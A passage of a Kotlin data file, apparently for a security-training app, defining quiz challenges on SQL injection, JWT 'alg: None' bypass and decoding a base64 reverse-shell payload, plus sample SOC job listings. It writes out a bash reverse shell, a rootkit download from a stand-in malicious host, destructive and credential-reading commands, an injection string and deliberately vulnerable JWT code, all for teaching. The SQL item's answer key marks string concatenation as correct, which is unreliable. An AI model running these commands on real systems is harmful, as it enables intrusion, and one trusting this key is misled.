                "query = \"SELECT * FROM users WHERE username = ? AND pass = ?\"\n    cursor.execute(query, (username, password))",
                "query = \"SELECT * FROM users WHERE username = '\" + sanitize(username) + \"' AND pass = '\" + sanitize(password) + \"'\"",
                "query = \"SELECT * FROM users WHERE username = :1 AND pass = :2\".format(username, password)"
            ),
            answerIndex = 1,
            testCasesDescription = "Validates that input strings are parsed as strict parameters, neutralizing ' OR 1=1 -- exploit payloads completely."
        ),
        CodingChallenge(
            id = "code_jwt",
            title = "JWT Alg None Verification Bypass",
            description = "The application accepts JWT assertions without validating the signing algorithm.",
            language = "Kotlin / Java",
            initialCode = """
// Vulnerable verification block:
fun verifyToken(token: String): Claims {
    val parser = Jwts.parser()
    // VULNERABLE: Accepts any signature, even if the algorithm header is set to 'None'!
    return parser.parseClaimsJws(token).body
}
            """.trimIndent(),
            instructions = "Identify the core security fix that must be enforced during JWT parsing.",
            multipleChoiceOptions = listOf(
                "Remove signature checking entirely to improve speed.",
                "Verify signature is present, but skip algorithm check if it says 'None'.",
                "Enforce signature verification using a pre-configured trusted HMAC key and call setSigningKey(secretKey).",
                "Change token expiration time from 1 hour to 5 minutes."
            ),
            answerIndex = 2,
            testCasesDescription = "Validates that any JWT containing an 'alg: None' header is immediately rejected as untrusted, preventing authentication bypass."
        ),
        CodingChallenge(
            id = "code_base64",
            title = "Inspect Exploitation Payloads",
            description = "A reverse shell payload has been detected in base64. Decode it to analyze the IP address and communication port.",
            language = "Cyber Analysis",
            initialCode = "Payload: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=",
            instructions = "What command is executed when the decoded payload runs?",
            multipleChoiceOptions = listOf(
                "rm -rf /etc/ssh/",
                "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
                "wget http://malicious-server.ru/rootkit.sh && chmod +x",
                "cat /etc/passwd"
            ),
            answerIndex = 1,
            testCasesDescription = "Checks the analyst's capability to safely parse base64-encoded strings and extract indicators of compromise (IOCs)."
        )
    )

    val jobListingsList = listOf(
        JobListing(
            id = "job_1",
            title = "Junior Security Analyst (SOC)",
            company = "SecOps Technologies",
            location = "Remote / New York",
            type = "Full-time",
            salary = "${"$"}75,000 - ${"$"}90,000",
            recruiterName = "Sarah Connor (Talent Specialist)",
            description = "We are seeking a vigilant Junior Security Analyst to join our 24/7 Security Operations Center. You will monitor network telemetry, investigate suspicious alerts, and escalate active incidents.",
            requirements = listOf(
                "CompTIA Security+ certification (highly preferred)",
                "Basic understanding of TCP/IP, OSI model, and firewalls",
                "Experience analyzing packet captures in Wireshark",
                "Strong analytical and log-correlation mindset"
            )
        ),
        JobListing(
            id = "job_2",
            title = "Information Security Consultant",
            company = "Apex GRC Partners",
            location = "Hybrid (Chicago, IL)",
            type = "Full-time",
            salary = "${"$"}110,000 - ${"$"}135,000",
            recruiterName = "David Miller (Director of Recruitment)",
            description = "Join our Governance, Risk, and Compliance (GRC) team to guide enterprise clients through risk mitigation, compliance audits (SOC2, ISO 27001), and secure architecture design.",
            requirements = listOf(
                "CISSP certification is mandatory",
                "5+ years of corporate information security auditing experience",
                "Excellent knowledge of quantitative risk estimation (ALE/SLE)",
                "Outstanding professional presentation and communication skills"
            )
        )
    )
}
